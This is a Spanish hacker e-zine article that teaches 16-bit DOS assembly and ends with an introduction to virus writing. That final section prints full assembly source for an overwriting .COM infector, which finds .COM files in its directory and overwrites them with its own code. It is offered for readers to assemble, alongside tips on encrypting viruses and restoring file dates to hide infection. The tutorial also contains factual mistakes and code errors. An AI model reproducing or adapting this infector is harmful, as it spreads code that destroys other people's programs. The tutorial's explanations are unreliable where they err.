@@ -1,0 +1,1050 @@
+<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<< DP 4 >>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
+**** [ S_K ][ skiller@flashmail.com ] ******************* { ASM } ********
+--------------------------------------------------------------------------
+
+
+Lo primero... espero que no os mosqueeis... he decidido, ante la
+"brevedad" del curso, meterlo todo en un solo articulo, y como quedaria un
+poco cutre poner a partir de donde lo habia dejado en el otro, pos lo he
+vuelto a escribir desde el principio. Pero os prometo que ya no os doy mas
+la brasa, aqui va el curso completo. Tambien he de deciros que lo que aqui
+explicado es para virus que funcionan en MsDos, es decir, bajo 16 bits,
+aunque tambien se pude hacer que funcionen en Windows, pero que quede
+claro que hoy en dia cualquier virus de 16 bits no hara tanto da¤o en una
+maquina con Win32, como en una maquina con MsDos y los procesadores de 16
+bits.
+
+Empezamos!!!
+
+---------------------
+HEXADECIMAL y BINARIO
+---------------------
+Imagino que muchos ya sabreis que es esto, pero para los que no lo sepan ahi
+va una explicacion.
+En ASM no podemos utilizar el sistema decimal ya que el procesador solo puede
+leer datos en binario, estos datos nosotros se los pondremos en hexadecimal.
+
+Esto es un numero en binario 0,1,1,0,0,0,1,1 que en decimal seria el numero 99.
+En el sistema binario los numeros no tienen el mismo valor que en el sistema
+decimal. Aqui el 1 podemos decir que significa ACTIVO y el 0 NO ACTIVO. Para
+pasar un numero binario a decimal o vicevesa habra que utilizar la siguiente
+tabla:
+     
+2^7  2^6  2^5  2^4  2^3  2^2  2^1  2^0 
+128  64   32   16    8    4    2    1
+
+Entonces, miramos el numero binario y las cifras que sean 1 son las que vamos
+a utilizar. Miramos la tabla y todas las posiciones en las que haya un 1 en el
+binario las calculamos y sumamos. Es decir, el numero 0,0,0,0,0,0,1,1 habria
+que cojer las dos ultimas cifras porque son las que son 1. Miramos la tabla
+y vemos que las dos ultimas cifras corresponden a 2^1 y a 2^0 asi que
+calculamos cuanto es 2 elevado a 1 y vemos que es 2 y calculamos 2 elevado a
+0 y vemos que es 1 los sumamos y vemos que da 3 pues ese es el numero
+0,0,0,0,0,0,1,1 en decimal. Os pongo un par de ejemplos mas:
+
+1,0,0,0,0,0,1,1 -------> 131
+0,0,1,1,1,1,0,0 -------> 60
+
+Ahora os preguntareis ¨porque simpre ha puesto 8 numeros? pues porque un byte
+esta formado por 8 bits y cada una de esas cifras es un bit. Cada byte tiene
+256 maneras distintas de escribirse, desde 0,0,0,0,0,0,0,0 hasta
+1,1,1,1,1,1,1,1 por lo tanto cada byte tiene 256 funciones.
+Dicho esto, logicamente 16 bits seran dos bytes y 32 bits seran 4 bytes.
+Con 16 bits tenemos 65536 funciones, os sonara este numero de la configuracion
+de la pantalla, pues si elejimos eso significara que tenemos 65536 colores
+distintos. Con 32 bits tenemos 4294967296 funciones.
+A los 16 bits (2 bytes) se les llama WORD o PALABRA y a los 32 bits (4 bytes)
+se les llama DOUBLE WORD o DOBLE PALABRA.
+
+Ahora vamos con el sistema hexadecimal. Os dareis cuenta que seria muy
+complicado hacer un programa poniendo las funciones en binario asi que se
+utiliza el sistema hexadecimal, usea, que utilizaremos 16 digitos distintos,
+(0,1,2,3,4,5,6,7,8,9,A,B,C,D,E,F). Asi que el numero 79 en hexadecimal seria
+4F. Para calcular un numero en hexadecimal lo que debeis hacer es dividir el
+numero decimal entre 16 y el cociente sera el primer digito del numero
+hexadecimal y el resto sera el segundo. Logicamente si el resto es 10,11,12,13,
+14,15 no sera ese numero, sino que sera la letra correspondiente A,B,C,D,E,F.
+Ejemplo:
+numero decimal --> 79
+
+79/16  cociente: 4  resto: 15 ---> F
+
+numero hexadecimal --> 4F
+
+Bueno, esto ya esta explicado. Para pasar numeros de un sistema a otro os
+recomendaria que utilizaseis una calculadora que lo hiciera. La de windows
+la poneis en CIENTIFICA y os deja hacerlo.
+
+-----------------------------------------
+INSTRUCCIONES, FUNCIONES e INTERRUPCIONES
+-----------------------------------------
+Ante todo saber de que vamos a hablar.
+
+Instruccion: pues es eso, una especie de comando, que no es un comando, que
+hace algo. Ejemplo: MOV AX,FF la instruccion seria MOV.
+La definicion me ha quedado muy cutre pero si no la entendeis ahora mas
+adelante lo hareis.
+
+Funcion: es un bit escrito en hexadecimal. Cada funcion hace una cosa.
+Ejemplo: la funcion 9 imprime cadenas.
+
+Interrupcion: es una especie de funcion que hace una llamada a la BIOS o al
+DOS y que le dice que haga algo. Ejemplo: la interrupcion 10 es para cambiar
+el modo de video.
+
+---------
+REGISTROS
+---------
+Lo primero que debeis saber es lo que son los registros. Son una especie de
+memoria temporal que tiene el microprocesador. En ellas se meten las
+instrucciones con su funcion correspondiente y la interrupcion (esto lo
+explicare mas tarde).
+
+Hay varios registros y cada uno se utiliza para una cosa:
+-El CS indica el segmento en el que se encuentra el programa. Es de dos bytes.
+-El IP indica el offset actual. Es de dos bytes.
+
+Si quereis ver esto podeis ejecutar el debug de DOS y poner A <enter> y os
+saldra algo asi: xxxx:0100. El numero xxxx es el registro CS y el 0100 es el
+IP.
+
+-El DS y el ES se utilizan para muchas cosas, como imprimir cadenas, mover
+datos en memoria, para utilizar de punteros, etc. Ambos son de dos bytes.
+-El SS es la pila o stack y el SP contiene el offset de la pila.
+-El SI, DI y BP tambien lo utilizaremos como punteros, entre otras cosas.
+Tambien son de dos bytes.
+
+Los que mas utilizaremos:
+-El AX lo utilizaremos para indicar las funciones a las interrupciones.
+-El BX lo utilizaremos para trabajar con ficheros.
+-El CX como contador.
+-El DX es el registro de datos, lo utilizaremos como puntero.
+
+Estos ultimos son todos de dos bytes, aunque tambien los podemos utilizar
+como registros de un byte. Para diriginos a ellos pondriamos en lugar de AX,
+por ejemplo, AL o AH, en la que la L significa LOW (parte baja del registro)
+y H significa HIGH (parte alta del registro). COn el resto seria igual,
+BL, BH, etc.
+
+[Explicacion sobre la pila o stack: este es un registro especial, es del
+tama¤o del que sea el micro (32 bits en los pentium), y en el puedes meter
+datos que luego puedes sacar directamente a un registro. Hasta ahi todo bien,
+pero la mayor caracteristica del stack es que debes sacar los datos en el
+sentido inverso en el que los has metido. El propio nombre lo dice "pila"
+porque las funciones estan apiladas y no puedes intentar sacar la que esta
+abajo del todo porque encima hay muchas mas, logico, no???.]
+
+[Hoy en dia con la aparicion de los procesadores de 32 bits han aparecido
+los registros extendidos, EAX, etc.]
+
+---------------
+INSTRUCCION MOV
+---------------
+Las instrucciones indican a la funcion que quieres utilizar lo que tiene que
+hacer.
+
+La primera es la mas sencilla pero tambien la que mas vamos a utilizar. Es la
+instruccion MOV.
+Esta, mete la funcion que le indiquemos en el registro que le digamos.
+Ejemplos:
+
+MOV AX,4F  ;metemos en el registro AX la funcion 4F
+
+Tambien podemos mover lo que hay en un registro a otro:
+
+MOV AX,BX  ;metemos el valor de BX en AX, pero conservamos lo que hay en BX,
+           ;es decir lo copiamos
+
+Tambien podemos meter los datos en memoria:
+
+MOV [AX],CX
+MOV AX,DS:[3d02h]
+
+Lo de la "h" al final es para indicar que es un numero en hexadecimal, si
+fuera un numero decimal se pondria "d".
+
+NOTA:Esto ultimo es importante, en el debug de DOS no hace falta indicar que
+tipo de numero es pero hay otros muchos ensambladores en los que si hace
+falta.
+
+Tambien hay MOV's especiales como:
+
+MOVSB -> mueve el byte direccionado por DS:SI a ES:DI
+MOVSW -> mueve la palabra direccionada por DS:SI a ES:DI
+
+Aunque en esto ya entrare mas en profundidad cuando tratemos los punteros.
+
+---------
+INC y DEC
+---------
+INC sirve para incrementar en una unidad cualquier registro o posicion de
+memoria y DEC justo para lo contrario, reducir.
+
+INC BX  ;aumenta en uno el valor que hay en BX
+DEC DX  ;reduce en uno DX
+
+Con direccion de memoria:
+
+INC WORD PTR [BX]
+
+Despues de explicar estas sencillisimas instrucciones continuamos adelante.
+Animo!!! Todavia quedan mazo paginas por leer, xD
+
+---------
+ADD y SUB
+---------
+Sirven para sumar y restar. ADD sumar y SUB restar.
+En el caso de sumar sumaria los dos operandos y los guardaria en el primero.
+En el caso de restar resta el primero al segundo y lo guarda en el primero.
+
+ADD AX,BX  ;suma AX y BX y lo mete en AX
+ADD AX,17h ;suma al registro AX 17
+SUB CX,AX  ;resta a CX el valor de AX y lo mete en CX
+SUB CX,4Fh ;resta al registro CX 4F
+
+[NOTA:lo de poner ";" es para comentar las lineas y asi indicar al
+ensamblador que eso no lo debe ensamblar. Seria como "/*" y "*/" en C]
+
+-----------------
+AND, OR, XOR, NOT
+-----------------
+Son operaciones "logicas". Para entenderlas bien debeis haber entendido muy
+bien lo que es el sistema binario (ya sabeis, en el articulo de k3rne1z).
+
+AND:
+Significa "y" y se utiliza confrontando dos bits dando el resultado 1 cuando
+las dos esten a 1 y 0 en el resto de los casos.
+
+    numero   numero   resultado
+      1        1          1
+      0        0          0
+      1        0          0
+      0        1          0
+
+OR:
+Significa "o" y el resultado es 1 cuando al menos uno de los bits esta a 1.
+
+    numero   numero   resultado
+      1        1          1
+      0        0          0
+      1        0          1
+      0        1          1
+
+XOR:
+Es un OR exclusivo. El resultado es 1 cuando uno y solo uno de los bits
+esta a 1.
+
+    numero   numero   resultado
+      1        1          0
+      0        0          0
+      1        0          1
+      0        1          1
+
+NOT:
+Niega el valor, es decir, lo invierte. Se utiliza sobre un solo bit.
+Si este esta a 1 lo pone a 0, y si esta a 0 lo pone a 1.
+Tambien se puede utilizar con un registro, con lo que invirtiria todos los
+bits del registro.
+
+NOT AX
+
+A alguno de vosotros esto le puede recordar a la logica de Filosofia que se
+daba en 3§ de BUP. Yo lo estoy dando ahora ;)
+
+-----
+FLAGS
+-----
+Estos bits son muy importantes ya que los vamos a utilizar en muchas
+operaciones, por ejemplo al buscar archivos.
+Todas ocupan un registro de 16 bits aunque no esta totalmente ocupado ya
+que solo son 9 flags y cada una ocupa 1 bit.
+
+Registro de flags:
+
+     =================================================================
+     -  -  -  -  - O - D - I - T - S - Z -  - A -  - P -  - C -
+     =================================================================
+
+O: overflow
+D: direccion
+I: interrupciones rehabilitadas
+T: trampa
+S: signo
+Z: cero
+A: acarreo auxiliar
+P: paridad
+C: acarreo
+: no utilizado
+
+->Flag de acarreo:
+Este flag salta cuando en un registro el numero se desborda, es decir, no
+cabe en el registro. El flag se pone a 1 para avisarnos de que esto ha
+pasado. Para resumir, el flag se activa cuando hay un paso del valor maximo
+al minimo o al reves. Tambien nos va a servir para comprobar errores, etc.
+Por ejemplo, si hacemos un programa que busca un fichero en el directorio
+y no lo encuentra, este bit se activa.
+Este bit no es afectado por las ordenes de incremento y decremento.
+Para poner este bit a 0 utiliza CLC
+Para poner este bit a 1 utiliza STC
+
+->Flag de signo:
+Cuando operamos con numeros enteros con signo nos interesa saber que signo
+tiene el numero. Este bit sirve para eso. Si el bit esta a 0 el numero es
+positivo y si el bit esta a 1 es negativo.
+
+->Flag de desbordamiento:
+Funciona cuando tratamos con numeros enteros y se activa cuando se pasa del
+mayor numero positivo al menor negativo, esto es, del 127 (en un solo byte)
+a -128 (en un byte). Se activa cuando un valor no cabe en el destino.
+
+->Flag de cero:
+Se activa cuando el resultado de una operacion aritmetica o logica es cero.
+
+->Flag de acarreo auxiliar:
+Se activa si en una operacion aritmetica se produce acarreo de peso 16.
+
+"Estos tres flags que quedan el programador los puede activar para que el
+procesador responda a algunas situaciones segun el programador quiera"
+
+->Flag de trampa:
+Si el programador lo pone a 1 el procesador ejecuta las instrucciones una a
+una bajo el control del usuario.
+Se suele poner a 1 para hacer depuraciones del codigo del programa que se este
+ejecutando.
+
+->Flag de interrupcion:
+Si esta a 1 las interrupciones estan permitidas, si esta a 0 no.
+Para poner este bit a 0 utiliza CLI
+Para poner este bit a 1 utiliza STI
+
+->Flag de direccion:
+Dependiendo si el programador pone este bit a 0 o a 1 las cadenas de bytes
+seran tratadas como crecientes o decrecientes.
+Para poner este bit a 0 utiliza CLD
+Para poner este bit a 1 utiliza STD
+
+Aqui acaban todos los flags, como os dije al principio alguno de ellos nos
+sera muy importante para algunas operaciones bastante comunes en el virii.
+
+[PULSE UNA TECLA PARA CONTINUAR]   !!!PLINK!!!  Continuamos...
+
+----------
+CMP y TEST
+----------
+Son instrucciones de comparacion.
+Compara dos registros o un registro y una direccion de memoria.
+Se utilizaria asi:
+
+CMP AX,BX
+
+Si AX y BX fueran iguales el flag de cero se pondria a 1. CMP tiene el mismo
+formato que SUB. A la hora de comparar los valores hay que tener en cuenta
+que estos deben ser del mismo tama¤o, es decir no podriamos poner CMP AX,CL
+ya que AX es una palabra (word, 2 bytes) y CL es de un byte.
+
+TEST tiene el mismo formato que ADD y lo unico que los diferencia es que no
+se guarda el resultado, es decir, compara un registro y un valor que
+queramos y si son iguales el bit de cero se pone a 1.
+
+Otro par de instrucciones faciles explicadas. Seguimos adelante, venga que
+cada vez queda menos!!!
+
+Haber... que explico ahora? mmmmm, voy a explicar como se usan los punteros
+y algo sobre las direcciones de los registros para poder seguir, mas tarde,
+explicando otras instrucciones.
+
+--------
+PUNTEROS
+--------
+Esto es IMPORTANTISIMO ya que lo usaremos muchisimo. Lo primero es definir
+puntero.
+
+Puntero: instruccion que se¤ala a alguna parte del programa o a alguna
+         direccion de memoria.
+
+Al tratar con punteros hay que tener muy en cuenta siempre que registro al
+que se¤alamos o el registro que utilizamos para se¤alar a alguna parte.
+Tambien hay que tener muy claros los registros.
+
+Como vimos al principio, los registros CS:IP van se¤alando en el segmento en
+el que se encuentra el programa. El programa siempre comienza en xxxx:0100
+ya que esos 100 primeros bits estan ocupados por datos del .COM llamados
+DTA.
+
+Por cada instruccion que vayamos poniendo el registro IP ira cambiando segun
+los bits que ocupe cada instruccion. Ejemplo:
+
+xxxx:0100 MOV AH,4Eh  ;vemos como la instruccion MOV ocupa 1 bit y otro mas
+xxxx:0102             ;que ocupa el utilizar un registro de 1 bit
+
+Asi que, si por ejemplo queremos se¤alar a alguna parte del programa en
+concreto podemos utilizar el registro DX.
+Logicamente seria un co¤azo tener que andar calculando los bits para indicar
+al programa la direccion exacta y para eso estan los OFFSETS y la instruccion
+LEA.
+Para utilizar estas instrucciones hace falta marcar con etiquetas las partes
+del programa a las que luego vamos a se¤alar con un puntero.
+
+Escribiriamos:
+
+MOV DX,OFFSET nombre_etiqueta
+
+o tambien podriamos utilizar LEA (eso lo dejo a vuestra eleccion)
+
+LEA DX,nombre_etiqueta
+
+Las etiquetas debes ponerlas justo a la parte donde quieres se¤alar, y se
+escribirian asi:
+
+nombre_etiqueta:
+
+con los dos puntos para se¤alar que es una etiqueta. Con esto conseguimos
+que al ensamblar el programa se¤ale el ensamblador sustituya la etiqueta por
+la direccion exacta a esa parte del programa y asi no se la tenemos que
+indicar nosotros :)))
+El programa saltaria a esa zona del programa y seguiria por ahi hasta que
+vuelvas a poner un salto u otra etiqueta o finalice el programa, etc.
+
+----
+LOOP
+----
+Esta instruccion nos sirve para ejecutar una parte del codigo que nosotros
+queramos el numero de veces que queramos.
+Para ello utilizaremos el registro CX, conocido como contador precisamente
+por eso. En el registro CX metemos, en decimal, las veces que queramos que
+se repita. Vamos con un ejemplo.
+
+  =========================COMIENZA EL PROGRAMA=============================
+<++> DP4/CODIGO/asm1.asm
+
+          MOV CX,3d
+
+main:
+          MOV DX,OFFSET TEXTO
+          MOV AH,9h
+          INT 21h
+          LOOP main
+          INT 20h
+
+cadena    db 'HOLA S_K, vaya rollo que nos estas contando'
+          db '$'
+
+<-->
+  ==========================FINALIZA EL PROGRAMA============================
+
+Voy a comentarlo un poco.
+En "MOV CX,3d" metemos en el contador (registro CX) las veces que queremos
+que se repita el programa, que en este caso es imprimir una cadena de
+caracteres. Luego ponemos la etiqueta "main", que es donde empieza el programa
+que queramos repetir, para luego llamarlo con la instruccion LOOP. En la
+linea "MOV DX,OFFSET TEXTO" ponemos el puntero se¤alando a la cadena que
+vamos a imprimir. Luego en "MOV AH,9h" metemos en AH la funcion 9 que es la
+de imprimir cadenas y con la interrupcion 21 lo ejecutamos. Imprime la cadena
+y llega a "LOOP main" con lo que el programa se vuelve a esa etiqueta tantas
+veces como le hayas indicado, asi cuando el registro CX se queda a 0 deja de
+imprimir. El "INT 20h" es para finalizar el programa.
+En la etiqueta cadena definimos la cadena que queremos imprimir poniendola
+entre '' y debajo ponemos '$' para indicar que ya acaba la cadena.
+Hare una puntuacion importante ya que hay una cosa que puede llevar a dudas,
+¨por que el MOV CX,3d va fuera de la etiqueta main? pues es muy simple,
+porque si estuviera dentro, cada vez que se ejecutase el programa moveria al
+registro CX 3 y el programa entraria en bucle asi que imprimiria la cadena
+sin parar. Podeis provar a hacerlo y asi lo veis mejor.
+
+Parece que esto esta, ahora probad a ensamblarlo y vereis como funciona.
+Con este ejemplo ya habeis visto como se utiliza el LOOP, las etiquetas,
+como se definen cadenas y la funcion para imprimirlas. Cada vez sabemos mas!!!
+
+---
+REP
+---
+Se usa con CMP, MOVSB y MOVSW. Lo que hace es repetir una de esas
+instrucciones tantas veces como le indiquemos en el registro CX. Es una
+instruccion parecida a LOOP ya que va decrementando el valor de CX para saber
+cuando debe parar de repetir, pero no repite partes de codigo, sino que mueve
+hacia una direccion un byte o una palabra. Para utilizar esta instruccion
+habra que tener muy en cuenta el flag de direccion ya que este indicara hacia
+donde se realizara el movimiento del/os byte/s.
+Recordad que con CLD vamos hacia delante y con STD hacia atras.
+Tambien hay que indicar los punteros DI y SI para ver la parte que queremos
+mover.
+Ejemplo:
+
+CLD              ;el movimiento hacia delante
+MOV CX,3d        ;vamos a hacer 3 movimientos
+MOV DI,100h      ;puntero DI se¤alando a donde comienza lo que queremos mover
+MOV SI,10Ah      ;puntero SI se¤alando hasta donde llega lo que queremos mover
+REP MOVSB        ;funcion REP con MOVSB para mover un byte
+
+Otra instruccion mas que ya esta explicada. Ahora, para cambiar un poco voy
+a explicar como se utiliza la pila o stack. Es muy facil y nos sera muy util
+a la hora de optimizar los programas.
+
+------------
+PILA o STACK
+------------
+Interesante apartado. La pila, como ya dije al principio, tiene la capacidad
+de la que sea el microprocesador, usea, que si tu tienes un procesador de
+32 bits la pila podra almacenar 32 bits, ni uno mas!!!
+La mayoria de vosotros tendreis micros de 32 bits ya que el ultimo de 16 bits
+que hubo creo que fue el 8086 y no creo que nadie utilice esos ordenadores
+hoy en dia. Tambien se preve la salida de los micros de 64 bits lo que
+provocara incompatibilidades de softwrae y haradware entre ambos micros (32
+bits y 64 bits).
+Pero vamos con lo que nos interesa. Como tambien dije al principio, la pila
+tiene una caracteristica que le diferencia del resto de los registros. Hay
+que sacar los valores en el sentido inverso de haberlos metido.
+
+  ======================COMIENZA EXPLICACION CUTRE==========================
+
+  Imaginemos que vosotros teneis apilados unos cuantos libros, pongamos que
+  teneis... 16, pues si quereis coger el que pusisteis, al apilarlos, en la
+  posicion 8 para sacarlo tendreis que quitar primero los otros 7 que estan
+  encima no??? aunque claro, tambien podeis intentar sacarlo sin quitarlos
+  y lo mas normal es que se os caigan, pues eso tambien pasa con el stack,
+  y sino que se lo pregunten a los usuarios de Guindous.
+
+  =======================FINALIZA EXPLICACION CUTRE=========================
+
+Despues de esto espero que lo hayais entendido.
+Pues venga, vamos con las instrucciones:
+
+Para meter un valor en la pila utilizamos PUSH. Podemos meter un valor
+directamente o meter el valor que hay en un registro. Ejemplo:
+
+PUSH 39h   ;metemos el valor 39 (en hexadecimal) en la pila
+PUSH AX    ;metemos el valor que hay en AX en la pila
+
+Para sacar los datos de la pila utilizaremos POP y pondremos el registro
+al que lo queremos sacar. Ejemplo:
+
+POP AX     ;mete el valor que estuviera en la cima de la pila en el registro
+           ;AX
+
+Tambien hay un par de instrucciones especiales que tienen que ver con el
+registro de flags.
+
+PUSHF      ;mete en la pila el contenido del registro de flags
+POPF       ;introduce en el registro de flags el valor que este en la cima
+           ;de la pila
+
+Como veis el stack es un registro muy interesante y que sirve para un monton
+de cosas, entre ellas optimizar los programas.
+
+----
+CALL
+----
+Pues en ensamblador tambien hay llamadas a procedimientos (codigos) que,
+por ejemplo, durante un programa vamos a utilizar varias veces. Asi que si
+existe esto ¨para que vamos a escribir el mismo codigo 20 veces en el mismo
+programa pues? pues para nada, asi que aprendamos a utilizarlas.
+
+Para definir un procedimiento hay que hacerlo de la siguiente forma:
+
+nombre_procedimiento PROC   ;comienza el codigo del procedimiento
+.
+.                           ;codigo del procedimiento
+.
+RET                         ;retornamos del procedimiento
+nombre_procedimiento ENDP   ;final del procedimiento
+
+Si lo que vamos a hacer es llamar al procedimiento desde otro segmento es
+necesario que utilicemos FAR.
+
+[Explicacion de segmento: ¨os acordais de CS:IP?, pues eso es, el CS nos
+ indica en que segmento se encuentra el programa.]
+
+Pues eso, si lo llamamos desde otro segemento habra que poner esto:
+
+nombre_procedimiento PROC FAR
+.
+.
+.
+RET
+nombre_procedimiento ENDP
+
+Si lo llamamos desde el mismo lo hariamos como puse al principio que es
+equivalente a poner:
+
+nombre_procedimiento PROC NEAR
+.
+.
+.
+RET
+nombre_procedimiento ENDP
+
+Aunque yo creo que es mas sencillo ponerlo como al principio. Lo digo porque
+hay que escribir menos xD
+
+Ahora... ah si! para llamar al procedimiento solo teneis que utilizar la
+instruccion CALL. Ejemplo:
+
+CALL nombre_procedimiento
+
+En lo que se refiere a instrucciones solo nos queda una por dar. Tened en
+cuenta que hay muchas mas de las que yo explico aqui, pero para lo que vamos
+a utilizar nosotro el ensamblador con estas mas todo lo que queda por
+explicar sobre memorias nos vale.
+
+----------------------------
+JMP o SALTOS INCONDICIONALES
+----------------------------
+¨que porque son incondicionales? pues eso, porque saltan sin ninguna condicion,
+solo porque tu se lo mandas, ¨has visto que obedientes? xD
+
+Los saltos sirven para ir a una zona del programa saltando todo el codigo que
+hay entre la instruccion del salto y la etiqueta a la que va.
+
+La instruccion es JMP y tambien pueden ser dentro o fuera del mismo segemento.
+Se indica igual que en CALL, con NEAR y FAR.
+Los saltos pueden estar a etiquetas que esten antes o despues del JMP, incluso
+si el JMP esta dentro de esa etiqueta. Ejemplo:
+
+JMP hola   ;saltamos a la etiqueta hola:
+
+Pero los mas interesantes para nosotros seran los saltos condicionales.
+
+--------------------
+SALTOS CONDICIONALES
+--------------------
+Estos si que saltan por alguna condicion en concreto, jeje. Hay muchos y
+cada uno salta por algo diferente, la mayoria estan relacionados con el valor
+que tengas los Flags y habra que utilizar comparaciones, ya sabeis CMP.
+Para utilizar bien los saltos incondicionales tendre que hacer una aclaracion
+sobre una cosa que se me olvido explicar en en apartado de CMP. Lo que hace
+el procesador al comparar los dos operandos que tu le diste es restarlos, pero
+mediante unos registros internos a los que no tiene acceso el programador.
+Por ejemplo, si los dos operandos son iguales, al restarlos, el resultado
+sera 0 por lo que el flag de Zero se pondra a 1.
+
+Los saltos condicionales deben estar entre el rango (-127,128) es decir, que
+pueden saltar 128 bits hacia delante y 127 hacia atras.
+
+Ahora viene la explicacion de todos los saltos, uno por uno. Pillaos una
+cerveza y poneos agusto porque viene lo bueno.
+
+Para simplificar un poco, a partir de ahora cuando me refiera a un flag pondre
+la inicial del flag (salen todas al principio, en la explicacion del registro
+de flags) y f. Ejemplo: Zf (flag de zero)
+
+Saltos en datos sin signo:
+
+->Salta si igual              Zf=1 utilizaremos JE
+->Salta si no igual           Zf=0 utilizaremos JNE
+->Salta si superior           Cf=0 y Zf=0 utilizaremos JA
+->Salta si superior o igual   Cf=0 utilizaremos JAE
+->Salta si inferior           Cf=1 utilizaremos JB (mm eso me recuerda a algo)
+->Salta si inferior o igual   Cf=1 o Zf=1 utilizaremos JBE
+
+Saltos en datos con signo:
+
+->Salta si igual              Zf=1 utilizaremos JE
+->Salta si no igual           Zf=0 utilizaremos JNE
+->Salta si mayor              Zf=0 y Sf=Of utilizaremos JG
+->Salta si mayor o igual      Sf=Of utilizaremos JGE
+->Salta si menor              Sf<>Of utilizaremos JL
+->Salta si menor o igual      Zf=1 o Zf<>Of utilizaremos JLE
+
+Saltos basados en CMP aritmeticas:
+
+->Salta si negativo           Sf=1 utilizaremos JS
+->Salta si no negativo        Sf=0 utilizaremos JNS
+->Salta si se ha producido acarreo     Cf=1 utilizaremos JC
+->Salta si no se ha producido acarreo  Cf=0 utilizaremos JNC
+->Salta si se ha producido overflow    Of=1 utilizaremos JO
+->Salta si no se ha producido overflow Of=0 utilizaremos JNO
+->Salta si paridad par         Pf=1 utilizaremos JP
+->Salta si paridad impar       Pf=0 utilizaremos JNP
+->Salta si.....................CX=0 utilizaremos JCX
+
+[Paridad: indica el numero de 1 que hay en un registro o variable. Si ese
+ numero es par diremos que hay paridad par y si es impar paridad impar]
+
+Pues todo eso son saltos condicionales, ahora sabiendo cual es cada uno y
+sabiendo lo que hace la instruccion CMP podreis utilizarlos de acuerdo con lo
+que necesiteis. Bufff ya llevo 4 horas seguidas escribiendo todo este rollazo,
+24 kb!!!! A este paso me dan el nobel de literatura xD
+
+----------------
+DATOS EN MEMORIA
+----------------
+Ya solo queda explicar el manejo de datos en memoria.
+Hay una estrucutura caracteristica para indicar que lo que estamos haciendo
+son operaciones en memoria.
+
+Debemos indicar si es un BYTE (8 bits) o WORD (16 bits). Escribiriamos asi:
+
+instruccion BYTE o WORD PTR [X]
+
+Voy a explicar eso. En donde pone instruccion pondriamos la instruccion que
+queremos utilizar, todas las funciones explicadas anteriormente tambien sirven
+aqui. Luego indicariamos si es BYTE o WORD y el PTR indica que manejamos
+memoria. Luego, entre corchetes indicamos una direccion de memoria o una
+variable que haya sido definida anteriormente.
+En el caso de utilizar la instruccion MOV hay que a¤adir un par de datos mas.
+Indicariamos el segmento y luego, entre corchetes el offset o la variable. Al
+final, despues de los corchetes pondriamos una coma "," y a continuacion el
+valor que queremos meter. El segmento mas utilizado es el DS (segmento de
+datos) aunque tambien se utiliza el ES (segmento extra de datos). Tambien
+hay que utilizar el valor del final en otras instrucciones como por ejemplo
+CMP, en la que habria que poner el valor con el que queremos comparar esa
+posicion de memoria. Ejemplo:
+
+MOV BYTE PTR DS:[2345h],090h
+
+MOV WORD PTR ES:[2345h],090h
+
+CMP BYTE PTR DS:[7896h],090h
+
+Hay que tener en cuenta que si movemos una funcion de tipo WORD ocuparemos
+el offset indicado y el siguiente. Ejemplo:
+
+MOV WORD PTR DS:[4040h],03d2h
+
+Esto significa que la funcion "03d2h" al ocupar dos bytes ocuparia el offset
+indicado "4040h" y el siguiente "4041h".
+
+En definitiva, manejar la memoria es igual que utilizar los registros
+temporales solo que hay que tener en cuenta el segmento y el offset donde
+lo guardamos y poner BYTE o WORD seguido de PTR para indicar que son datos
+que utilizaremos en memoria.
+
+---------------------------------------
+INTRODUCCION A LA PROGRAMACION DE VIRUS
+---------------------------------------
+Voy a referirme a virus en archivos .COM ya que los .EXE tienen una estructura
+mas compleja y para empezar es mas sencillo hacerlo con los .COM
+
+Los archivos .COM ocupan como maximo 65 kbytes ya que ocupan un solo segmento
+de memoria. Los 256 bytes (100h) estan ocupados por el PSP donde el programa
+guarda datos que necesita, por ejemplo: almacenar la cola de ordenes, sirve
+de buffer de archivo, etc. A partir del 80h esta el DTA que es una zona muy
+interesante para nosotros (en una de las rutinas de mas abajo esta explicado).
+
+La caracteristica principal de un virus es que tiene la capacidad de copiarse
+en otros archivos cuando se ejecute el o en algunos mas sofisticados cuando
+se ejecute un programa, etc.
+Por lo tanto lo primero es hacer la rutina de infectado. Una vez hecha solo
+nos quedaria hacer el virus en si y meterlo en la rutina en la zona adecuada
+para que se ejecute perfectamente. Tambien podriamos encriptarlo para evitar
+asi que fuera detectado con mucha facilidad, modificar en el DTA la hora y
+fecha de modificacion del archivo para asi ocultar que este fue modificado por
+el virus poniendo la hora que tenia anteriormente de ser infectado, vamos,
+que podemos a¤adirle un monton de cosas.
+
+En cuanto a la rutina de infectado hay que hacer una que no sobreescriba, es
+decir, que infecte el programa y que luego, cuando ese programa sea ejecutado
+se ejecute el virus para infectar otros archivos y seguidamente el programa
+de manera que la persona no sospechara.
+
+Hoy en dia los virus basados en Ms-Dos no son tan da¤inos como los basados en
+Win32, aunque si que se pueden hacer buenos virus basados en Ms-Dos.
+
+Ahora os pongo un par de rutinas de infectado para que veais, mas o menos, como
+se programa en ASM.
+
+
+Esta primera rutina es bastante cutre ya que sobreescribe el programa al que
+infecta y ademas solo infecta archivos que sean mas peque¤os que el. Solo
+infecta en el mismo directorio donde el este.
+
+-----------------------------COMIENZA EL CODIGO-------------------------------
+
+<++> DP4/CODIGO/asm_viri.asm
+
+
+comienzo:         
+                     mov ah,4eh                     
+                     mov dx,offset tipo 
+
+;funcion buscar archivo y puntero dirigido a tipo
+
+buscarabrir:
+                     int 21h                           
+                     jc final 
+
+;si no encuentra archivo finaliza programa (bit de acarreo en 1), si lo
+;encuentra continua (bit de acarreo en 0)
+         
+                     mov ax,3d02                  
+                     mov dx,9eh                     
+                     int 21h           
+                     jc cerrar
+
+;funcion abrir archivo, seleccionamos el nombre del archivo en el DTA, si ya
+;esta infectado cierra archivo (bit de acarreo en 1) y busca otro, si no esta
+;infectado (bit de acarreo en 0) continua
+
+                     xchg bx,ax 
+
+;guardamos el handel                  
+
+                     mov ah,40h                     
+                     mov cl,longitud                 
+                     mov dx,offset comienzo 
+
+;funcion de copiar codigo, en CL indicamos el tama~o virus. Puntero indicando
+;desde donde se debe copiar
+                     
+                     int 21h 
+
+cerrar:
+                     mov ah,3eh                   
+                     int 21h
+
+;cerramos el archivo
+
+                     mov ah,4fh                       
+                     jmp buscarabrir  
+
+;funcion de buscar otro archivo y saltamos a buscarabrir   
+
+final:
+                     int 20h                             
+
+;salimos al dos
+
+tipo db          '*.COM',0   
+
+;tipo de ficheros a buscar e infectar                        
+
+theend:
+longitud         equ offset theend - offset comienzo   
+
+;indica la memoria que ocupa el virus
+
+<-->
+------------------------------FINAL DEL CODIGO--------------------------------
+
+
